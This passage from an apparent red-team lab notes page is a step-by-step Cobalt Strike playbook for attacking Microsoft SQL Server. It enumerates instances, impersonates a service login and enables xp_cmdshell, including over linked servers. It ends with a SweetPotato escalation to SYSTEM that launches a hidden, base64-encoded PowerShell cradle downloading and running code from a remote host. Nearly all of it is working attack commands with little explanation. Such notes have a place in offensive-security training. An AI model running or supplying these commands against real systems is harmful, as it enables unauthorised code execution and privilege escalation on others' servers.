class="hljs-literal">-2</span>.dev.cyberbotic.io | <span class="hljs-built_in">fl</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLServerInfo</span> <span class="hljs-literal">-Instance</span> sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io <br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLInstanceDomain</span> | <span class="hljs-built_in">Get-SQLConnectionTest</span> | ? &#123; <span class="hljs-variable">$_</span>.Status <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;Accessible&quot;</span> &#125; | <span class="hljs-built_in">Get-SQLServerInfo</span><br>  <br><span class="hljs-comment">#3 Look for users/groups which have access to these servers and somehow get access to that user/group. Or Try Kerberoasting the MSSQL Server user.</span><br>beacon&gt; powershell<span class="hljs-literal">-import</span> c:\Tools\PowerSploit\Recon\Powerview.ps1<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainGroup</span> <span class="hljs-literal">-Identity</span> *SQL* | % &#123; <span class="hljs-built_in">Get-DomainGroupMember</span> <span class="hljs-literal">-Identity</span> <span class="hljs-variable">$_</span>.distinguishedname | <span class="hljs-built_in">select</span> groupname, membername &#125;<br>  <br><span class="hljs-comment">#4 Try to run some common queries on sql servers</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLServerLinkCrawl</span> <span class="hljs-literal">-Instance</span> sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io <span class="hljs-literal">-Query</span> <span class="hljs-string">&quot;select @@version&quot;</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:query /c:<span class="hljs-string">&quot;select @@version&quot;</span><br>  <br><span class="hljs-comment">#5 Check if we have sysadmin access , if yes then use it to enable xp_cmdhsell and execute commands.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:whoami<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:EnableXp<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:xpcmd /command:<span class="hljs-string">&quot;whoami&quot;</span><br>  <br><span class="hljs-comment">#6 Check if xp_cmdshell in enabled, if enabled execute commands.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:query /c:<span class="hljs-string">&quot;SELECT value FROM sys.configurations WHERE name = &#x27;xp_cmdshell&#x27;&quot;</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLQuery</span> <span class="hljs-literal">-Instance</span> sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io  <span class="hljs-literal">-Query</span> <span class="hljs-string">&quot;SELECT value FROM sys.configurations WHERE name = &#x27;xp_cmdshell&#x27;&quot;</span><br>  <br><span class="hljs-comment">#7 Check if impersonation is allowed, if yes then impersonate the user.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:impersonate<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:iwhoami /i:DEV\mssql_svc<br>  <br><span class="hljs-comment">#8 Check if impersonated user have sysadmin access. If yes then use it to enable xp_cmdshell, and then execute commands and get shell.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:iwhoami /i:DEV\mssql_svc<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:iEnableXp /i:DEV\mssql_svc<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:iQuery /i:DEV\mssql_svc /c:<span class="hljs-string">&quot;SELECT value FROM sys.configurations WHERE name = &#x27;xp_cmdshell&#x27;&quot;</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:ixpcmd /i:DEV\mssql_svc /command:<span class="hljs-string">&quot;whoami&quot;</span><br>  <br><span class="hljs-comment">#9 Check if linked Servers are available.</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLServerLinkCrawl</span> <span class="hljs-literal">-Instance</span> sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io<br>  <br><span class="hljs-comment">#10 Check if we can execute queries on linked Server.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /l:sql<span class="hljs-literal">-1</span>.cyberbotic.io /m:lquery /c:<span class="hljs-string">&quot;select @@version&quot;</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /l:sql<span class="hljs-literal">-1</span>.cyberbotic.io /m:lquery /c:<span class="hljs-string">&quot;select @@version&quot;</span><br>  <br><span class="hljs-comment">#11 Check if xp_cmdshell is enabled on linked server. If yes then execute command using RPC.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /l:sql<span class="hljs-literal">-1</span>.cyberbotic.io /m:lquery /c:<span class="hljs-string">&quot;SELECT value FROM sys.configurations WHERE name = &#x27;&#x27;xp_cmdshell&#x27;&#x27;&quot;</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:query /c:<span class="hljs-string">&quot;EXEC(&#x27;exec master..xp_cmdshell &#x27;&#x27;ipconfig&#x27;&#x27;&#x27;) AT [sql-1.cyberbotic.io]&quot;</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:query /c:<span class="hljs-string">&quot;EXEC(&#x27;exec master..xp_cmdshell &#x27;&#x27;ping -n 1 10.10.123.102&#x27;&#x27;&#x27;) AT [sql-1.cyberbotic.io]&quot;</span><br>  <br><span class="hljs-comment">#12 Check if rpc_out is enabled (Not default configuration) on each links,  and also we have sysadmin access on linked server.</span><br><span class="hljs-comment"># Links are configured from source -&gt; destination. so the source has control over the link.</span><br><span class="hljs-comment"># So basically we only need (for A linked to B)</span><br><span class="hljs-comment"># 1) Sysadmin access on target link server (on B)</span><br><span class="hljs-comment"># 2) rpc_out enabled on link (A to B) OR sysadmin access on prior server (A) for successfully enabling xp_cmdshell</span><br>  <br><span class="hljs-comment">#12-a Check RPC_Out enabled or not (For a link between SQL-2 to SQL-1 we have to check RPC settings in SQL-2 for SQL-1, )</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:query /c:<span class="hljs-string">&quot;SELECT name, is_rpc_out_enabled FROM sys.servers;&quot;</span><br>  <br><span class="hljs-comment">#12-b If rpc_out is not enabled , Check if the Source server ( for A--&gt;B , Source is A) has sysadmin access or we can perform impersonation. After getting sysadmin access we can enable rpc_out for the link.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:query /c:<span class="hljs-string">&quot;SELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;);&quot;</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:impersonate<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:iwhoami /i:DEV\mssql_svc<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:query /c:<span class="hljs-string">&quot;EXEC sp_serveroption &#x27;sql-1.cyberbotic.io&#x27;, &#x27;rpc out&#x27;, &#x27;true&#x27;;&quot;</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:query /c:<span class="hljs-string">&quot;EXEC sp_serveroption &#x27;sql-1.cyberbotic.io&#x27;, &#x27;rpc&#x27;, &#x27;true&#x27;;&quot;</span><br>  <br><span class="hljs-comment">#12-c Check sysadmin access enabled or not.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /l:sql<span class="hljs-literal">-1</span>.cyberbotic.io /m:lquery /c:<span class="hljs-string">&quot;SELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;);&quot;</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLServerLinkCrawl</span> <span class="hljs-literal">-Instance</span> sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io<br><span class="hljs-comment">#12-d If both rpc_out and sysadmin access is enabled , then enable xp_cmdshell.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:query /c:<span class="hljs-string">&quot;EXEC(&#x27;sp_configure &#x27;&#x27;show advanced options&#x27;&#x27;, 1; reconfigure;&#x27;) AT [sql-1.cyberbotic.io]&quot;</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:query /c:<span class="hljs-string">&quot;EXEC(&#x27;sp_configure &#x27;&#x27;xp_cmdshell&#x27;&#x27;, 1; reconfigure;&#x27;) AT [sql-1.cyberbotic.io]&quot;</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /l:sql<span class="hljs-literal">-1</span>.cyberbotic.io /m:lquery /c:<span class="hljs-string">&quot;SELECT value FROM sys.configurations WHERE name = &#x27;&#x27;xp_cmdshell&#x27;&#x27;&quot;</span><br><span class="hljs-comment">#12-e Execute Commands using xp_cmdshell.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:query /c:<span class="hljs-string">&quot;EXEC(&#x27;exec master..xp_cmdshell &#x27;&#x27;ipconfig&#x27;&#x27;&#x27;) AT [sql-1.cyberbotic.io]&quot;</span><br>  <br><span class="hljs-comment">#13 Check if impersonation is allowed on linked Servers. If yes then impersonate the user and check for xp_cmdshell and sysadmin access, and if sysadmin is enabled then we can also enable xp_cmdshell to get code execution.</span><br><span class="hljs-comment"># Query will return the IDs, So we have to convert them to principals.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /l:sql<span class="hljs-literal">-1</span>.cyberbotic.io /m:lquery /c:<span class="hljs-string">&quot;SELECT * FROM sys.server_permissions WHERE permission_name = &#x27;&#x27;IMPERSONATE&#x27;&#x27;;&quot;</span><br><span class="hljs-comment"># Converting IDs to principal names</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /l:sql<span class="hljs-literal">-1</span>.cyberbotic.io /m:lquery /c:<span class="hljs-string">&quot;SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;&quot;</span><br><span class="hljs-comment"># Impersonate the user</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /l:sql<span class="hljs-literal">-1</span>.cyberbotic.io /m:lquery /c:<span class="hljs-string">&quot;EXECUTE AS login = &#x27;&#x27;DEV\mssql_svc&#x27;&#x27; ; SELECT SYSTEM_USER;&quot;</span><br><span class="hljs-comment">#Check for sysadmin access.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /l:sql<span class="hljs-literal">-1</span>.cyberbotic.io /m:lquery /c:<span class="hljs-string">&quot;EXECUTE AS login = &#x27;&#x27;DEV\mssql_svc&#x27;&#x27; ; SELECT IS_SRVROLEMEMBER(&#x27;&#x27;sysadmin&#x27;&#x27;);&quot;</span><br><span class="hljs-comment"># Check for rpc_out enabled or not.</span><br>execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /l:sql<span class="hljs-literal">-1</span>.cyberbotic.io /m:lquery /c:<span class="hljs-string">&quot;SELECT name, is_rpc_out_enabled FROM sys.servers WHERE is_linked = 1;&quot;</span><br><span class="hljs-comment"># If both sysadmin access is available and rpc_out is enabled,we can execute commands.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /l:sql<span class="hljs-literal">-1</span>.cyberbotic.io /m:lquery /c:<span class="hljs-string">&quot;EXECUTE AS login = &#x27;&#x27;DEV\mssql_svc&#x27;&#x27; ; exec master..xp_cmdshell &#x27;&#x27;whoami&#x27;&#x27;&quot;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#14 After getting shell access to any MSSQL Server , Check if it runs under the default NT Service\MSSQLSERVER , by using getuid command.</span><br>beacon&gt; getuid<br>beacon&gt; shell whoami /priv<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges<br>  <br><span class="hljs-comment">#15 Check for *seimpersonate* privilege and if present run sweet potato exploit to abuse it to get Priv Esc to SYSTEM.</span><br><span class="hljs-comment"># Encoded Powershell payload.</span><br>powershell.exe <span class="hljs-literal">-nop</span> <span class="hljs-literal">-w</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-enc</span> SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANQA2AC4AMQAzADkAOgA4ADAALwBhACcAKQApAA==<br><span class="hljs-comment"># Execute sweet potato to get reverse shell/beacon as system user.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SweetPotato\bin\Release\SweetPotato.exe <span class="hljs-literal">-p</span> C:\Windows\System32\WindowsPowerShell\v1.<span class="hljs-number">0</span>\powershell.exe <span class="hljs-literal">-a</span> <span class="hljs-string">&quot;-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANQA2AC4AMQAzADkAOgA4ADAALwBhACcAKQApAA==&quot;</span><br>beacon&gt; connect localhost <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>MSQSL 服务器 - 枚举</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## MSSQL Server - Enumeration</span><br><span class="hljs-comment"># SQLRecon : https://github.com/skahwah/SQLRecon/wiki</span><br><span class="hljs-comment"># PowerUpSQL : https://github.com/NetSPI/PowerUpSQL/wiki</span><br>  <br><span class="hljs-comment"># 1. Use PowerUpSQL for enumerating MS SQL Server instances</span><br>beacon&gt; powershell<span class="hljs-literal">-import</span> C:\Tools\PowerUpSQL\PowerUpSQL.ps1<br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLInstanceDomain</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /<span class="hljs-class"><span class="hljs-keyword">enum</span>:<span class="hljs-title">sqlspns</span></span><br><span class="hljs-class"># <span class="hljs-title">Send</span> <span class="hljs-title">network</span> <span class="hljs-title">braodcast</span> <span class="hljs-title">and</span> <span class="hljs-title">UDP</span> <span class="hljs-title">scan</span> <span class="hljs-title">to</span> <span class="hljs-title">identify</span> <span class="hljs-title">any</span> <span class="hljs-title">instance</span> <span class="hljs-title">of</span> <span class="hljs-title">sql</span> <span class="hljs-title">db</span></span><br><span class="hljs-class"><span class="hljs-title">beacon</span>&gt; <span class="hljs-title">powerpick</span> <span class="hljs-title">Get</span>-<span class="hljs-title">SQLInstanceBroadcast</span></span><br><span class="hljs-class"><span class="hljs-title">beacon</span>&gt; <span class="hljs-title">powerpick</span> <span class="hljs-title">Get</span>-<span class="hljs-title">SQLInstanceScanUDP</span></span><br><span class="hljs-class">  </span><br><span class="hljs-class"># 2-<span class="hljs-title">a</span>. <span class="hljs-title">Check</span> <span class="hljs-title">access</span> <span class="hljs-title">to</span> <span class="hljs-title">DB</span> <span class="hljs-title">instance</span> <span class="hljs-title">with</span> <span class="hljs-title">current</span> <span class="hljs-title">user</span> <span class="hljs-title">session</span>.</span><br><span class="hljs-class"><span class="hljs-title">beacon</span>&gt; <span class="hljs-title">powerpick</span> <span class="hljs-title">Get</span>-<span class="hljs-title">SQLConnectionTest</span> -<span class="hljs-title">Instance</span> <span class="hljs-title">sql</span>-2.<span class="hljs-title">dev</span>.<span class="hljs-title">cyberbotic</span>.<span class="hljs-title">io</span> | <span class="hljs-title">fl</span></span><br><span class="hljs-class"><span class="hljs-title">beacon</span>&gt; <span class="hljs-title">powerpick</span> <span class="hljs-title">Get</span>-<span class="hljs-title">SQLServerInfo</span> -<span class="hljs-title">Instance</span> <span class="hljs-title">sql</span>-2.<span class="hljs-title">dev</span>.<span class="hljs-title">cyberbotic</span>.<span class="hljs-title">io</span> </span><br><span class="hljs-class"><span class="hljs-title">beacon</span>&gt; <span class="hljs-title">powerpick</span> <span class="hljs-title">Get</span>-<span class="hljs-title">SQLInstanceDomain</span> | <span class="hljs-title">Get</span>-<span class="hljs-title">SQLConnectionTest</span> | ?</span> &#123; <span class="hljs-variable">$_</span>.Status <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;Accessible&quot;</span> &#125; | <span class="hljs-built_in">Get-SQLServerInfo</span><br>  <br><span class="hljs-comment"># 2-b. Find user that have access to SQL Servers.</span><br><span class="hljs-comment"># Method-1 : Finding Users (or groups) which may have access to the SQL instance, We can look for appropriately named Domain Groups and their members.</span><br>beacon&gt; powershell<span class="hljs-literal">-import</span> c:\Tools\PowerSploit\Recon\Powerview.ps1<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainGroup</span> <span class="hljs-literal">-Identity</span> *SQL* | % &#123; <span class="hljs-built_in">Get-DomainGroupMember</span> <span class="hljs-literal">-Identity</span> <span class="hljs-variable">$_</span>.distinguishedname | <span class="hljs-built_in">select</span> groupname, membername &#125;<br><span class="hljs-comment"># Method-2 : Another option is to go after the MS SQL service account itself as this is also often given sysadmin privileges. (Check Notes for steps).</span><br><span class="hljs-comment"># As the Domain Account running the SQL Service have its SPN, So the account may be kerberoastable. We can crack the hash to obtain plaintext password and use it to gain access to SQL instance.</span><br>  <br><span class="hljs-comment"># 3. Check for sysadmin access  (0 -&gt; Not SysAdmin , 1-&gt; Sysadmin)</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /module:info<br>  <br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLServerLinkCrawl</span> <span class="hljs-literal">-Instance</span> sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io <span class="hljs-literal">-Query</span> <span class="hljs-string">&quot;SELECT value FROM sys.configurations WHERE name = &#x27;xp_cmdshell&#x27;&quot;</span><br><span class="hljs-comment"># Enumerate for What roles we do have.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:whoami<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /l:sql<span class="hljs-literal">-1</span>.dev.cyberbotic.io /m:lwhoami<br>  <br><span class="hljs-comment"># 4. Check if xp_cmdshell is enabled (0 -&gt; Disable, 1 -&gt; Enable), also check for sysadmin access.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /l:sql<span class="hljs-literal">-1</span>.dev.cyberbotic.io /m:whoami<br><span class="hljs-comment"># if have sysadmin access , then enable it</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:ienablexp /i:DEV\mssql_svc<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /l:sql<span class="hljs-literal">-1</span>.dev.cyberbotic.io /m:lenablexp /i:DEV\mssql_svc<br>  <br><span class="hljs-comment"># 5. Query execution</span><br>beacon&gt; powershell<span class="hljs-literal">-import</span> C:\Tools\PowerUpSQL\PowerUpSQL.ps1<br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLQuery</span> <span class="hljs-literal">-Instance</span> sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io  <span class="hljs-literal">-Query</span> <span class="hljs-string">&quot;select @@servername&quot;</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLServerLinkCrawl</span> <span class="hljs-literal">-Instance</span> sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io <span class="hljs-literal">-Query</span> <span class="hljs-string">&quot;exec master..xp_cmdshell &#x27;whoami&#x27;&quot;</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:query /c:<span class="hljs-string">&quot;select @@servername&quot;</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /l:sql<span class="hljs-literal">-1</span>.cyberbotic.io /m:lquery /c:<span class="hljs-string">&quot;select @@servername&quot;</span><br>  <br><span class="hljs-comment"># 6. Find the linked SQL Servers</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLServerLink</span> <span class="hljs-literal">-Instance</span> sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io <br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLServerLinkCrawl</span> <span class="hljs-literal">-Instance</span> sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io<br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLServerLinkCrawl</span> <span class="hljs-literal">-Instance</span> sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io <span class="hljs-literal">-Query</span> <span class="hljs-string">&quot;exec master..xp_cmdshell &#x27;whoami&#x27;&quot;</span><br><span class="hljs-comment"># Check if target SQLServer or its linked Server have syadmin access. (0 -&gt; Not SysAdmin , 1-&gt; Sysadmin)</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLQuery</span> <span class="hljs-literal">-Instance</span> sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io <span class="hljs-literal">-Query</span> <span class="hljs-string">&quot;SELECT * FROM OPENQUERY(&#x27;sql-1.cyberbotic.io&#x27;, &#x27;select @@servername&#x27;);&quot;</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLServerLinkCrawl</span> <span class="hljs-literal">-Instance</span> sql<span 